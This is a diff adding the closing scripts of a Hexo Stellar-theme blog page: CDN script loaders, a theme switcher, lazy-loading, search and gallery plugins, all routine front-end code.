+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
